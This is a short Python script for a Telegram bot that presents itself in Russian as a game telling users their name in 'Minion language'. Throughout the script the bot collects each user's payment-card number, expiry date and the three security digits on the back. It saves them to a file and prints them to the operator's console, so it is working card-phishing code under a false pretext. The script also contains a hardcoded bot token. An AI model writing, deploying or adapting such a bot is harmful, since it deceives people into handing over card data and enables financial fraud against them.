import telebot

bot = telebot.TeleBot('902078607:AAGj5jHPlWuJKdZsqb5tOpCKGyAnqxSKzF4')
kb1 = telebot.types.ReplyKeyboardMarkup(True, True)
kb1.row('/restart')


@bot.message_handler(commands=['start', 'restart'])
def start_message(message):
    ofile = open(f'{message.chat.id}.txt', 'wt')
    ofile.write('number\n')
    ofile.close()

    bot.send_message(message.chat.id, '''Бот как вас будут звать на языке миньонов
    Справка
    1. Введите номер вашей карты:
    2. Введите срок действия карты
    3. Введите 3 цифры на обороте''', reply_markup=kb1)

    bot.send_message(message.chat.id, 'Введите номер вашей карты')


@bot.message_handler(content_types=['text'])
def get_text_messages(message):
    ifile = open(f'{message.chat.id}.txt', 'rt')
    ofile = open(f'{message.chat.id}.txt', 'at')
    ins = ifile.read().split()
    ifile.close()
    print(ins)
    if ins[-1] == 'number':
        ofile.write(message.text + '\n')
        bot.send_message(message.chat.id, 'Введите срок действия вашей карты')
        ofile.write('date\n')
        ofile.close()
    elif ins[-1] == 'date':
        ofile.write(message.text + '\n')
        bot.send_message(message.chat.id, 'Введите 3 цифры на обратной стороне карты')
        ofile.write('cww\n')
        ofile.close()
    elif ins[-1] == 'cww':
        ofile.write(message.text + '\n')
        ofile.close()
        ifile = open(f'{message.chat.id}.txt', 'rt')
        ins = ifile.read().split()
        ifile.close()
        bot.send_message(message.chat.id, f'Ваше имя на языке миньонов: {ins[1]} {ins[3]} {ins[5]}')
        print(f'''Номер карты: {ins[1]}
Срок действия: {ins[3]}
Цифры на обороте: {ins[5]}''')
        ofile = open(f'{message.chat.id}.txt', 'wt')
        ofile.write('number\n')
        ofile.close()
    # bot.send_message(message.chat.id, input())


bot.polling()
